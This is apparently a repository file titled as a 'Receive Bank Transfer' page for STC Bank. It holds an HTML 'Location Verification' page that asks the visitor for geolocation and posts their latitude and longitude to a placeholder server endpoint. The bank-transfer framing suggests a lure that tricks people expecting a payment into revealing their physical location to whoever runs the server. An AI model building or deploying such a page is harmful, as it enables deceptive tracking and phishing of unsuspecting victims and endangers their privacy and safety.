# Receive-Bank-Transfer-
Bank Transfer -STC BANK
<!DOCTYPE html>
<html>
<head>
  <title>Location Check</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    button {
      padding: 15px 20px;
      font-size: 18px;
      border: none;
      background: #4CAF50;
      color: white;
      border-radius: 8px;
      cursor: pointer;
    }
    #output {
      margin-top: 30px;
      font-size: 16px;
    }
  </style>
</head>
<body>

<h2>Location Verification</h2>
<p>This page needs your permission to get your location.</p>
<button onclick="getLocation()">Allow Location Access</button>

<div id="output"></div>

<script>
function getLocation() {
  const output = document.getElementById("output");

  if (!navigator.geolocation) {
    output.innerHTML = "Your device does not support location.";
    return;
  }

  navigator.geolocation.getCurrentPosition(success, error);
}

function success(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;

  document.getElementById("output").innerHTML =
    "Location received:<br>Latitude: " + lat + "<br>Longitude: " + lon;

  // send location to your email or server
  fetch("https://your-server-endpoint.com/save_location", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ latitude: lat, longitude: lon })
  });
}

function error() {
  document.getElementById("output").innerHTML =
    "Location permission denied.";
}
</script>

</body>
</html>
